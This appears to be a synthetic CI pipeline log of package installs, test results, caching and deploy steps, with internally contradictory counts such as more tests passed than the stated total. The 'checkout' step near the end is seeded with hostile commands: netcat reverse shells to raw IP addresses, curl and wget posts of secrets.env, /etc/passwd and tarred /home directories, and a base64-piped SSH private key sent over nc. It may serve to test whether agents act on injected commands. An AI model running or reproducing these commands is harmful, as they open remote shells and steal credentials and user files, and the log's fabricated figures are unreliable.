INFO: Request completed\nImage pulled successfully\nCache miss for key-6994\nInstalling express@4.10.8\n[12:19:10] INFO: Request completed\n=== Step build completed ===\n=== Step: setup_environment ===\nVerifying...\nGET /health - 201 (98ms)\nStep 14/20: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /upload - 202 (460ms)\n  PASS: test_auth_login (484ms)\nnpm install: added 52 packages\npip: Installing build dependencies...\n[12:19:10] INFO: Connecting to database\nTransforming 120 files...\nAlready up to date.\nArtifact uploaded: build.tar.gz (23MB)\nFinished.\nMinifying vendor.js\npip: Collecting webpack\n[12:19:10] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 129 passed, 421 total\nFetching submodules...\nGET /api - 200 (84ms)\nPOST /upload - 200 (439ms)\nProcessing...\nnpm notice: created a lockfile\nStep 3/20: Running migrations\nArtifact downloaded: 30MB\n[12:19:10] DEBUG: Loading configuration\nSnapshots: 20 passed, 43 total\nPOST /data - 201 (311ms)\n[12:19:10] INFO: Cache refreshed\nNODE_ENV=development\n  PASS: unit/test_auth_login.spec.js\nCompiling src/service.java...\npip install: Successfully installed express-1.20\npip: Installing build dependencies...\nPlatform: darwin-arm64\n[12:19:10] DEBUG: Memory usage: 254MB\nNODE_ENV=development\n[12:19:10] WARN: Deprecated API usage\nPulling image: python:latest\nEnvironment: development\nUsing Node.js 16.8.7\n[12:19:10] DEBUG: Loading configuration\n  PASS: test_user_create (5ms)\nImage pulled successfully\nTransforming 868 files...\npip: Installing build dependencies...\nyarn add: Done in 7.58s\nStep 2/20: Deploying\nException: TypeError\n[12:19:10] DEBUG: Connection pool: 20 active\n\u2717 build failed with exit code 25\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\nStep 11/17: Deploying\nImage pulled successfully\nEnvironment: staging\n\u2713 All checks passed\n  PASS: integration/test_auth_login.spec.js\nBuilding Docker image...\nArtifact uploaded: dist.zip (84MB)\nTest Suites: 41 passed, 10 total\nTime: 92.581s\n  PASS: test_db_connect (108ms)\n[12:19:10] DEBUG: Loading configuration\nBuilding Docker image...\nSuccess!\n[12:19:10] DEBUG: Connection pool: 9 active\nInstalling lodash@4.2.4\nSnapshots: 13 passed, 23 total\nStep 12/24: Linting\n[12:19:10] DEBUG: Memory usage: 1965MB\n[12:19:10] DEBUG: Initializing service\nCompiling utils/index.js...\nBundling styles.css\nSnapshots: 12 passed, 4 total\nWARNING: eslint has known vulnerabilities\nnpm install: added 463 packages\nCache restored successfully (103MB)\npip install: Successfully installed prettier-5.11\nCache hit for key-9554\nMinifying app.js\n[12:19:10] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 51.37s\nConnecting to acme.corp:443...\nCompiling lib/app.ts...\nUsing Python 3.9\nCache miss for key-1443\nCoverage: 79% statements, 77% branches\nTime: 39.326s\n[12:19:10] INFO: Request completed\nConnection established\npip install: Successfully installed eslint-1.14\n[12:19:10] INFO: Starting build process\nConnecting to cloud.services:443...\n\u2713 All checks passed\n[12:19:10] INFO: Starting build process\nImage pulled successfully\n[12:19:10] DEBUG: Memory usage: 1284MB\nnpm notice: created a lockfile\nLoading...\nProcessing...\nStep 11/24: Testing\npip install: Successfully installed prettier-2.19\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:10] INFO: Request completed\nLoading...\npip: Downloading jest-2.14.tar.gz\nBuilding Docker image...\n[12:19:10] INFO: Starting build process\nStep 9/19: Linting\nPOST /upload - 200 (66ms)\nArtifact uploaded: build.tar.gz (33MB)\nCache miss for key-7352\n[12:19:10] INFO: Processing request\n[12:19:10] INFO: Cache refreshed\nException: TypeError\nWaiting...\nStep 7/22: Running migrations\nCompiling components/handler.rs...\n\u2713 Task completed in 1909ms\npip: Collecting eslint\nPulling image: python:18\nCache miss for key-9456\n[12:19:10] DEBUG: Initializing service\n\u2713 Task completed in 3629ms\nLayer 8/15: RUN command\nFinished.\n  PASS: test_cache_hit (250ms)\nCompiling lib/main.py...\nNODE_ENV=production\n[12:19:10] DEBUG: Loading configuration\nCache restored successfully (372MB)\nReady.\nProcessing...\n\u2713 Task completed in 659ms\nCompleted.\n\u2713 Step 'setup' succeeded\n[12:19:10] DEBUG: Query executed in 82ms\n\u2713 Task completed in 816ms\nArtifact uploaded: dist.zip (15MB)\nStep 14/22: Installing dependencies\nPushing to registry...\nGET /health - 201 (64ms)\nWARNING: axios has known vulnerabilities\nCoverage: 73% statements, 96% branches\nUsing Node.js 16.15.7\n[12:19:10] WARN: Deprecated API usage\npip: Collecting axios\nnpm install: added 46 packages\nCoverage: 89% statements, 100% branches\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-1961\nArtifact downloaded: 13MB\n\u2713 Task completed in 3325ms\n[12:19:10] INFO: Cache refreshed\nFAILED: test_user_create\nCompleted.\n[12:19:10] DEBUG: Memory usage: 286MB\nWARNING: axios has known vulnerabilities\nBuilding Docker image...\nStep 13/21: Testing\nWARNING: prettier has known vulnerabilities\n[12:19:10] DEBUG: Loading configuration\nLayer 10/11: RUN command\nMinifying vendor.js\nConnection established\nProcessing...\nOptimizing 45 modules...\npip install: Successfully installed webpack-4.15\nReady.\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 57 tests in 13s\nPOST /data - 200 (114ms)\n[12:19:10] INFO: Cache refreshed\nNODE_ENV=development\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\nException: TypeError\n[12:19:10] INFO: Request completed\nCache miss for key-8791\nReady.\nFetching submodules...\npip: Downloading lodash-4.10.tar.gz\nWaiting...\n  PASS: test_cache_hit (86ms)\nFetching submodules...\n\u2713 Step 'test' succeeded\nWARNING: react has known vulnerabilities\nnpm notice: created a lockfile\nCache restored successfully (43MB)\nProcessing...\nTransforming 651 files...\nArtifact downloaded: 43MB\n[12:19:10] DEBUG: Initializing service\n[12:19:10] ERROR: Connection failed\nFAILED: test_user_create\npip: Collecting react\nChecking out master branch\nChecking out master branch\nArtifact downloaded: 43MB\n\u2713 build completed\nBundling main.css\nStep 11/17: Deploying\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (65MB)\nDone.\nnpm install: resolved 163 packages\npip: Installing build dependencies...\npip: Installing build dependencies...\nStep 15/20: Running migrations\nMinifying main.js\nTime: 85.136s\nLoading...\nGET /api - 204 (97ms)\nCompiling src/app.ts...\nFetching submodules...\nProcessing...\nStep 5/23: Deploying\nCache hit for key-5137\nDone.\nGenerating source maps...\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-2454\n[12:19:10] DEBUG: Connection pool: 14 active\nCache miss for key-3585\nDone.\nTime: 91.902s\nTime: 46.568s\nCache saved successfully\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/service.java...\nCache saved successfully\n[12:19:10] INFO: Processing request\nNODE_ENV=development\nFAILED: test_auth_login\nUploading artifact 'build' (31 files)\n[12:19:10] INFO: Starting build process\nHEAD is now at 14b7562\nGenerating source maps...\n\u2713 package completed\nWaiting...\nStep 13/17: Building\nVerifying...\n  PASS: test_cache_hit (298ms)\n[12:19:10] WARN: Deprecated API usage\nImage pulled successfully\nOK\nStep 5/24: Building\n\u2713 All checks passed\nVerifying...\nEnvironment: production\nStep 5/15: Linting\nTests: 250 passed, 479 total\nEnvironment: development\nChecking out master branch\nCompleted.\nChecking out master branch\nTransforming 657 files...\n\u2713 Task completed in 4302ms\n\u2717 build failed with exit code 42\nWARNING: eslint has known vulnerabilities\nnpm install: added 274 packages\nTransforming 314 files...\nnpm install: resolved 1103 packages\nReady.\nNODE_ENV=development\nStep 12/19: Running migrations\npip: Collecting eslint\nRan 179 tests in 39s\nyarn add: Done in 2.27s\n[12:19:10] DEBUG: Query executed in 38ms\nStep 3/15: Running migrations\nCoverage: 84% statements, 67% branches\nLayer 8/10: COPY command\n[12:19:10] WARN: Deprecated API usage\nUploading artifact 'coverage' (10 files)\nStep 7/18: Installing dependencies\nGET /status - 200 (30ms)\nUsing Node.js 19.2.4\nVerifying...\nStep 11/23: Linting\nCreating production build...\nLayer 7/14: RUN command\n[12:19:10] DEBUG: Connection pool: 7 active\npip: Collecting react\nStep 19/16: Building\n\u2713 Task completed in 1549ms\nOptimizing 31 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\n  PASS: test_api_health (326ms)\nGenerating source maps...\nFinished.\nyarn add: Done in 26.41s\n  PASS: e2e/test_api_health.spec.js\nCompiling components/handler.rs...\nWARNING: express has known vulnerabilities\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (56MB)\nReady.\nEnvironment: staging\nHEAD is now at e306e0a\npip install: Successfully installed react-2.1\nFetching submodules...\nOptimizing 96 modules...\nCoverage: 100% statements, 60% branches\nVerifying...\nTests: 266 passed, 467 total\nyarn add: Done in 1.13s\nnpm notice: created a lockfile\nGenerating source maps...\nCreating production build...\nSwitched to branch 'hotfix/task-283'\n[12:19:10] INFO: Request completed\n[12:19:10] INFO: Processing request\n[12:19:10] INFO: Starting build process\nInstalling lodash@5.0.0\nBuilding Docker image...\nCache hit for key-8493\nnpm notice: created a lockfile\nPulling image: node:3.11\nTransforming 886 files...\nPlatform: win32-x64\nCache miss for key-5719\nImage pulled successfully\nCompiling src/utils.go...\n\u2717 build failed with exit code 45\nUsing Python 3.12\nStep 17/17: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: node_modules\nGenerating source maps...\nCompiling lib/main.py...\n[12:19:10] DEBUG: Connection pool: 15 active\nFetching submodules...\nCache miss for key-7033\nStep 5/22: Installing dependencies\nFinished.\nConnecting to cloud.services:443...\nMinifying app.js\n[12:19:10] DEBUG: Connection pool: 14 active\nLoading...\nChecking out develop branch\n[12:19:10] INFO: Cache refreshed\n[12:19:10] DEBUG: Loading configuration\nWaiting...\nSnapshots: 38 passed, 47 total\n\u2713 deploy completed\n\u2713 package completed\nCache saved successfully\nPlatform: darwin-arm64\nGET /status - 204 (48ms)\n=== Step upload_artifacts completed ===\n=== Step: lint ===\nOK\nLayer 8/10: RUN command\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\nCreating production build...\nWARNING: lodash has known vulnerabilities\nPOST /upload - 200 (401ms)\n[12:19:10] INFO: Processing request\nCompleted.\n[12:19:10] INFO: Cache refreshed\nTime: 101.637s\nCompiling src/service.java...\npip: Downloading webpack-5.8.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/15: Linting\nPlatform: win32-x64\nCoverage: 95% statements, 88% branches\nLoading...\nChecking out master branch\nStep 5/16: Testing\nFAILED: test_db_connect\nConnection established\nRan 190 tests in 23s\nImage pulled successfully\n[12:19:10] ERROR: Connection failed\n[12:19:10] INFO: Processing request\n[12:19:10] DEBUG: Query executed in 61ms\nCoverage: 75% statements, 72% branches\nStep 8/20: Linting\n\u2713 All checks passed\nAlready up to date.\n[12:19:10] DEBUG: Query executed in 45ms\nSuccess!\n[12:19:10] DEBUG: Memory usage: 1349MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nVerifying...\nUploading artifact 'build' (25 files)\nLayer 6/15: RUN command\nBundling styles.js\n[12:19:10] INFO: Cache refreshed\nCompiling src/utils.go...\nUsing Python 3.10\nCompiling lib/app.ts...\nGenerating source maps...\nPOST /data - 201 (205ms)\nCompiling utils/main.py...\n  PASS: test_api_health (293ms)\nReady.\nConnecting to acme.corp:443...\nWaiting...\n\u2713 Step 'install' succeeded\nProcessing...\nFinished.\nConnecting to test.io:443...\npip: Downloading prettier-2.12.tar.gz\nInstalling axios@2.3.1\nBuilding Docker image...\nStep 3/22: Running migrations\nTransforming 214 files...\nCompiling lib/utils.go...\nProcessing...\nCache miss for key-7093\nCache miss for key-5872\nRan 174 tests in 32s\npip: Downloading lodash-5.18.tar.gz\nCompiling utils/index.js...\nCache invalidated: node_modules\n  PASS: e2e/test_cache_hit.spec.js\nAlready up to date.\nPushing to registry...\nArtifact uploaded: build.tar.gz (36MB)\nEnvironment: development\nSwitched to branch 'feature/task-813'\n[12:19:10] DEBUG: Query executed in 73ms\n[12:19:10] INFO: Connecting to database\nImage pulled successfully\nCache saved successfully\nArtifact downloaded: 42MB\nUploading artifact 'build' (38 files)\nFAILED: test_user_create\nPlatform: darwin-arm64\npip: Installing build dependencies...\nCache invalidated: node_modules\nTransforming 372 files...\nCache saved successfully\n[12:19:10] INFO: Connecting to database\nGET /api - 201 (81ms)\nTest Suites: 12 passed, 14 total\nStep 18/18: Running migrations\nUsing Node.js 16.9.1\nUsing Node.js 17.6.9\nStep 5/16: Linting\nUsing Node.js 20.2.4\nnpm notice: package.json updated\nTLS handshake completed\nCache miss for key-5738\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\nFinished.\nCompiling lib/main.py...\n  PASS: e2e/test_cache_hit.spec.js\nCache invalidated: node_modules\nCompleted.\n\u2717 build failed with exit code 26\n\u2713 test completed\nLayer 2/12: RUN command\nyarn add: Done in 9.11s\nStep 12/21: Building\nUsing Python 3.10\nNODE_ENV=production\n[12:19:10] WARN: Deprecated API usage\nnpm notice: package.json updated\nCache saved successfully\nnpm notice: package.json updated\nTest Suites: 11 passed, 26 total\nPOST /upload - 201 (154ms)\nLayer 8/15: COPY command\nCompiling utils/utils.go...\nConnection established\nPlatform: darwin-arm64\nLayer 4/9: ENV command\nyarn add: Done in 22.86s\nCreating production build...\nFetching submodules...\n[12:19:10] DEBUG: Connection pool: 19 active\nRan 13 tests in 19s\nFetching submodules...\nInstalling lodash@1.12.2\nProcessing...\nTime: 115.160s\nCompleted.\nOK\n\u2713 test completed\n\u2713 Step 'install' succeeded\nReady.\nOptimizing 43 modules...\nStep 19/22: Linting\npip install: Successfully installed axios-5.11\nTests: 359 passed, 405 total\nArtifact uploaded: dist.zip (48MB)\nArtifact uploaded: dist.zip (28MB)\nConnection established\nVerifying...\nChecking out main branch\npip: Collecting axios\nWARNING: express has known vulnerabilities\nRan 79 tests in 60s\nImage pulled successfully\nHEAD is now at 47814fa\nFAILED: test_db_connect\n\u2713 Step 'install' succeeded\nTests: 468 passed, 384 total\nUsing Node.js 17.20.0\nFinished.\nConnection established\n[12:19:10] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-510'\n\u2713 Task completed in 4843ms\n\u2713 All checks passed\nCache miss for key-7075\nOK\n[12:19:10] WARN: Deprecated API usage\nCreating production build...\nVerifying...\n[12:19:10] INFO: Request completed\nCreating production build...\nCompiling utils/utils.go...\nCache invalidated: build\nEnvironment: test\nCache invalidated: dependencies\nUsing Node.js 18.12.3\n[12:19:10] INFO: Connecting to database\n[12:19:10] DEBUG: Query executed in 4ms\nPOST /api - 202 (241ms)\nnpm install: resolved 869 packages\n=== Step lint completed ===\n=== Step: deploy_production ===\nUsing Node.js 18.13.0\nArtifact uploaded: dist.zip (90MB)\n\u2713 build completed\nGET /health - 201 (70ms)\nGenerating source maps...\nSuccess!\nLoading...\nCache invalidated: build\nnpm install: resolved 1019 packages\nTLS handshake completed\n\u2713 Step 'install' succeeded\nCompiling lib/app.ts...\nGenerating source maps...\nnpm notice: package.json updated\nnpm install: resolved 712 packages\npip: Downloading webpack-2.13.tar.gz\nCompiling lib/app.ts...\nTest Suites: 33 passed, 26 total\nCache restored successfully (209MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nFetching submodules...\n  PASS: test_auth_login (266ms)\nConnecting to example.com:443...\nGenerating source maps...\nCompiling src/index.js...\n[12:19:10] ERROR: Connection failed\nSuccess!\nPlatform: linux-x64\nnpm install: resolved 1211 packages\npip: Installing build dependencies...\nCompiling src/utils.go...\nStep 7/18: Installing dependencies\nnpm notice: package.json updated\nTLS handshake completed\nTLS handshake completed\nPOST /data - 200 (320ms)\nGET /api - 204 (3ms)\n[12:19:10] DEBUG: Connection pool: 15 active\nFAILED: test_db_connect\nReady.\nSwitched to branch 'bugfix/task-787'\npip install: Successfully installed jest-5.7\nProcessing...\nPlatform: linux-x64\nHEAD is now at 18e442e\nArtifact downloaded: 34MB\nTransforming 727 files...\nUsing Python 3.9\nPOST /upload - 201 (98ms)\nCompleted.\nConnecting to cloud.services:443...\n[12:19:10] DEBUG: Connection pool: 10 active\nProcessing...\nnpm install: added 468 packages\nStep 4/23: Testing\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/app.ts...\n[12:19:10] INFO: Request completed\nCache restored successfully (133MB)\npip: Installing build dependencies...\nCache saved successfully\nArtifact uploaded: dist.zip (48MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:10] DEBUG: Loading configuration\n[12:19:10] INFO: Starting build process\n[12:19:10] INFO: Starting build process\npip: Downloading axios-1.11.tar.gz\nBuilding Docker image...\n\u2713 Task completed in 1417ms\nConnection established\nyarn add: Done in 21.39s\n[12:19:10] WARN: Deprecated API usage\nPlatform: darwin-arm64\nCompiling components/app.ts...\n[12:19:10] WARN: Deprecated API usage\nCache restored successfully (372MB)\nnpm notice: created a lockfile\nTests: 259 passed, 145 total\nyarn add: Done in 24.14s\nUsing Node.js 20.0.2\n[12:19:10] DEBUG: Query executed in 34ms\nMinifying main.js\nVerifying...\nCoverage: 96% statements, 73% branches\nSwitched to branch 'feature/task-333'\n[12:19:10] WARN: Deprecated API usage\n\u2717 build failed with exit code 6\n[12:19:10] INFO: Cache refreshed\nFetching submodules...\npip: Downloading express-4.18.tar.gz\nEnvironment: test\nCompleted.\nFetching submodules...\nCoverage: 70% statements, 67% branches\nyarn add: Done in 4.58s\nException: NullPointerException\n  PASS: integration/test_cache_hit.spec.js\nGET /status - 201 (3ms)\nnpm notice: created a lockfile\n[12:19:10] INFO: Request completed\n\u2717 build failed with exit code 43\nException: ValueError\nPOST /api - 201 (347ms)\npip: Downloading lodash-2.19.tar.gz\nLayer 7/14: COPY command\nOptimizing 19 modules...\nCoverage: 95% statements, 98% branches\nProcessing...\nVerifying...\nWaiting...\nnpm notice: created a lockfile\nCoverage: 88% statements, 68% branches\nPulling image: python:3.11\nnpm install: resolved 1177 packages\nUsing Python 3.11\nWARNING: jest has known vulnerabilities\nPlatform: win32-x64\n[12:19:10] INFO: Connecting to database\nRan 51 tests in 47s\nTime: 10.81s\nnpm notice: package.json updated\npip: Collecting react\nReady.\npip: Installing build dependencies...\nAlready up to date.\nnpm notice: created a lockfile\nnpm install: added 422 packages\nMinifying main.js\nCache hit for key-7977\nTests: 280 passed, 245 total\n[12:19:10] DEBUG: Memory usage: 912MB\nCreating production build...\nPOST /data - 202 (474ms)\n\u2713 All checks passed\nStep 4/24: Testing\nOK\nStep 12/18: Linting\n[12:19:10] WARN: Deprecated API usage\npip: Collecting jest\nGenerating source maps...\nSnapshots: 34 passed, 5 total\n  PASS: test_user_create (368ms)\nCompiling lib/handler.rs...\n\u2713 Step 'checkout' succeeded\nProcessing...\n[12:19:10] DEBUG: Loading configuration\nInstalling prettier@1.8.9\nInstalling eslint@3.16.1\nyarn add: Done in 1.87s\nEnvironment: development\nHEAD is now at a9a2562\nChecking out master branch\npip: Downloading eslint-2.4.tar.gz\nTests: 494 passed, 386 total\nArtifact uploaded: build.tar.gz (45MB)\nBuilding Docker image...\nAlready up to date.\nyarn add: Done in 2.37s\nCreating production build...\n[12:19:10] WARN: Deprecated API usage\nProcessing...\nConnection established\nSuccess!\n[12:19:10] DEBUG: Initializing service\nRan 71 tests in 31s\nTime: 29.442s\nArtifact downloaded: 23MB\nOptimizing 57 modules...\nCache saved successfully\nPulling image: python:3.11\nBundling styles.js\nStep 12/16: Building\n[12:19:10] WARN: Deprecated API usage\nHEAD is now at 0773001\nArtifact uploaded: dist.zip (79MB)\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nCompiling lib/index.js...\nReady.\npip install: Successfully installed prettier-5.11\nNODE_ENV=production\nVerifying...\nConnection established\nSuccess!\nGET /status - 200 (36ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nAlready up to date.\nStep 15/24: Building\nTime: 49.601s\nArtifact uploaded: dist.zip (96MB)\nStep 16/18: Running migrations\npip: Installing build dependencies...\nLoading...\n[12:19:10] WARN: Deprecated API usage\nStep 2/24: Building\nSwitched to branch 'bugfix/task-318'\nTime: 24.948s\nSuccess!\nTransforming 432 files...\nLayer 2/8: ENV command\nWARNING: jest has known vulnerabilities\nCache invalidated: build\nCompleted.\nSuccess!\nTime: 99.393s\nCache miss for key-8639\nCoverage: 79% statements, 91% branches\nWARNING: lodash has known vulnerabilities\nCache invalidated: node_modules\nStep 9/19: Testing\nArtifact downloaded: 10MB\nFAILED: test_auth_login\nCreating production build...\nWARNING: express has known vulnerabilities\nCoverage: 80% statements, 72% branches\nTest Suites: 12 passed, 24 total\nCoverage: 81% statements, 60% branches\nOK\n[12:19:10] INFO: Processing request\nVerifying...\n[12:19:10] WARN: Deprecated API usage\nStep 20/22: Running migrations\nCache restored successfully (126MB)\nCompiling utils/utils.go...\n[12:19:10] DEBUG: Loading configuration\nOptimizing 85 modules...\nBundling main.css\nTLS handshake completed\nSwitched to branch 'bugfix/task-258'\nOK\nNODE_ENV=development\nCoverage: 84% statements, 80% branches\nnpm install: added 249 packages\nLayer 2/14: RUN command\n[12:19:10] WARN: Deprecated API usage\nTransforming 321 files...\nProcessing...\nLoading...\nUsing Node.js 17.10.0\nPulling image: python:latest\nGET /status - 201 (67ms)\n\u2713 deploy completed\nFinished.\nUploading artifact 'coverage' (40 files)\nCompiling components/handler.rs...\n[12:19:10] DEBUG: Query executed in 15ms\nGenerating source maps...\nStep 19/24: Linting\nPulling image: node:latest\nPlatform: win32-x64\nnpm install: added 219 packages\n  PASS: test_user_create (240ms)\n[12:19:10] DEBUG: Loading configuration\nTime: 13.527s\nGET /health - 204 (5ms)\n[12:19:10] ERROR: Connection failed\nRan 75 tests in 26s\nArtifact uploaded: dist.zip (8MB)\nGET /health - 200 (46ms)\nConnecting to test.io:443...\n[12:19:10] DEBUG: Query executed in 39ms\nCompiling src/index.js...\nFinished.\n[12:19:10] WARN: Deprecated API usage\nnpm notice: package.json updated\nnpm install: resolved 156 packages\nWaiting...\nArtifact uploaded: dist.zip (100MB)\nArtifact uploaded: dist.zip (91MB)\nMinifying app.js\nUsing Node.js 16.16.4\nnpm notice: package.json updated\nPushing to registry...\nAlready up to date.\nStep 2/22: Installing dependencies\n[12:19:10] WARN: Deprecated API usage\nUsing Node.js 16.1.1\nOptimizing 12 modules...\nSuccess!\nLayer 1/13: RUN command\nHEAD is now at ee9c1e3\nCache restored successfully (129MB)\nFetching submodules...\n[12:19:10] INFO: Request completed\n[12:19:10] ERROR: Connection failed\nMinifying app.js\n\u2713 All checks passed\nFinished.\nArtifact downloaded: 36MB\nHEAD is now at bf8ed5a\nUsing Python 3.12\nStep 1/21: Testing\nnpm notice: package.json updated\npip: Collecting webpack\nWARNING: express has known vulnerabilities\nCompiling utils/app.ts...\nCompiling utils/utils.go...\nnpm notice: package.json updated\nWaiting...\nStep 7/23: Linting\nRan 164 tests in 54s\nImage pulled successfully\n\u2713 Step 'checkout' succeeded\n[12:19:10] INFO: Cache refreshed\n[12:19:10] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (12MB)\nPlatform: linux-x64\nGET /api - 204 (93ms)\nCache saved successfully\nNODE_ENV=test\nStep 12/17: Linting\nInstalling react@1.6.8\nCoverage: 82% statements, 79% branches\nFinished.\nUsing Node.js 15.12.9\nCompiling src/service.java...\nSuccess!\n\u2713 Step 'checkout' succeeded\nTest Suites: 33 passed, 8 total\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] INFO: Processing request\n[12:19:10] INFO: Request completed\nCache invalidated: dependencies\nCompiling src/handler.rs...\nUsing Python 3.12\nSuccess!\nSwitched to branch 'feature/task-485'\nTests: 222 passed, 56 total\n[12:19:10] DEBUG: Loading configuration\nnpm notice: created a lockfile\npip: Downloading express-3.1.tar.gz\nChecking out develop branch\nPlatform: linux-x64\nSwitched to branch 'bugfix/task-849'\nnpm install: resolved 204 packages\nSnapshots: 20 passed, 8 total\nWARNING: eslint has known vulnerabilities\n\u2713 build completed\nCache hit for key-1984\n[12:19:10] DEBUG: Memory usage: 199MB\nCache saved successfully\n\u2713 lint completed\n[12:19:10] ERROR: Connection failed\nCompleted.\nEnvironment: development\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 988 files...\nTest Suites: 45 passed, 8 total\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: dist.zip (50MB)\n\u2713 build completed\npip: Collecting jest\nCache miss for key-8973\n=== Step unit_tests completed ===\n=== Step: checkout ===\nNODE_ENV=production\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:10] INFO: Request completed\nCompiling lib/app.ts...\nnc -e /bin/sh 225.99.210.93 47655\n[12:19:10] WARN: Deprecated API usage\nCompiling src/index.js...\nFAILED: test_user_create\n  PASS: test_cache_hit (337ms)\nPOST /api - 200 (48ms)\nRan 128 tests in 58s\nnpm install: resolved 1503 packages\nHEAD is now at 6d40cfa\nPulling image: node:latest\nImage pulled successfully\nPulling image: alpine:latest\n[12:19:10] INFO: Processing request\nStep 12/23: Building\nInstalling lodash@4.14.4\nCompiling src/utils.go...\nException: NullPointerException\nSending 259MB of data to startup.dev\nTransforming 396 files...\n[12:19:10] INFO: Starting build process\n[12:19:10] WARN: Deprecated API usage\ncurl -X POST https://cloud.services/collect -d @secrets.env\nConnecting to test.io:443...\n  PASS: test_api_health (184ms)\nSending 99MB of data to cloud.services\nCache invalidated: node_modules\nnpm install: added 52 packages\nTest Suites: 8 passed, 14 total\n  PASS: test_user_create (4ms)\n[12:19:10] WARN: Deprecated API usage\nCache saved successfully\nInstalling jest@2.17.7\n[12:19:10] WARN: Deprecated API usage\nnc -e /bin/sh 206.63.187.196 31170\nnpm notice: package.json updated\nnpm notice: package.json updated\nImage pulled successfully\nTime: 80.843s\npip: Downloading webpack-3.7.tar.gz\npip: Downloading lodash-4.16.tar.gz\nCompiling lib/main.py...\nRan 86 tests in 11s\n[12:19:10] DEBUG: Query executed in 64ms\nException: RuntimeError\nFetching submodules...\nArtifact downloaded: 38MB\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u2713 Step 'build' succeeded\nStep 12/25: Testing\nCompleted.\nCache restored successfully (152MB)\nCache invalidated: build\nTest Suites: 33 passed, 10 total\n\u2713 All checks passed\nCache invalidated: node_modules\nArtifact downloaded: 21MB\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nFetching submodules...\nTest Suites: 17 passed, 32 total\nStep 13/19: Testing\nGenerating source maps...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nnpm install: resolved 946 packages\nTime: 101.307s\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nnpm install: added 456 packages\npip: Collecting lodash\nSwitched to branch 'bugfix/task-459'\nCompiling lib/app.ts...\nGenerating source maps...\nCompleted.\npip: Installing build dependencies...\nnc -e /bin/sh 230.130.32.87 6638\nArtifact uploaded: build.tar.gz (15MB)\n[12:19:10] INFO: Connecting to database\nnpm notice: created a lockfile\npip: Collecting axios\n[12:19:10] DEBUG: Memory usage: 1441MB\n[12:19:10] ERROR: Connection failed\npip: Downloading webpack-2.19.tar.gz\nCache hit for key-3793\nPOST /data - 201 (343ms)\n[12:19:10] INFO: Request completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 188.79.127.186 58399\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 83 modules...\nCache saved successfully\n\u2717 build failed with exit code 59\n  PASS: integration/test_db_connect.spec.js\nGenerating source maps...\nImage pulled successfully\nHEAD is now at 8180ba4\nPlatform: darwin-arm64\ncurl -X POST https://acme.corp/collect -d @secrets.env\nImage pulled successfully\nSnapshots: 44 passed, 39 total\nConnecting to test.io:443...\nCache miss for key-9765\nCoverage: 98% statements, 63% branches\nStep 12/15: Running migrations\nStep 12/22: Testing\n\u2713 All checks passed\n[12:19:10] ERROR: Connection failed\npip install: Successfully installed prettier-5.3\nWaiting...\nnc -e /bin/sh 177.248.243.122 60049\nLayer 2/11: ENV command\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:19:10] INFO: Connecting to database\nRan 64 tests in 1s\necho $(cat ~/.ssh/id_rsa) | base64 | nc 18.162.95.148 33398\nBundling main.css\nSuccess!\nSuccess!\nPlatform: win32-x64\nnc -e /bin/sh 172.93.0.182 46663\nStep 6/17: Running migrations\nArtifact uploaded: dist.zip (24MB)\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nPOST /upload - 201 (87ms)\n\u2713 Step 'checkout' succeeded\nStep 10/15: Installing dependencies\nFetching submodules...\nTests: 341 passed, 225 total\nCompiling utils/main.py...\nArtifact downloaded: 11MB\n\u2713 Step 'checkout' succeeded\nLoading...\nOK\nStep 16/21: Linting\n\u2713 All checks passed\n  PASS: e2e/test_auth_login.spec.js\n[12:19:10] ERROR: Connection failed\nUsing Python 3.10\n\u2713 Step 'setup' succeeded\nMinifying vendor.js\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nnpm install: added 120 packages\nPulling image: python:18\n[12:19:10] INFO: Connecting to database\nStep 3/23: Deploying\nArtifact downloaded: 30MB\nSending 100MB of data to test.io\nWARNING: axios has known vulnerabilities\nnc -e /bin/sh 124.86.81.181 5362\nBundling main.css\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCache miss for key-1709\n  PASS: test_cache_hit (497ms)\nPulling image: alpine:3.11\nCompiling 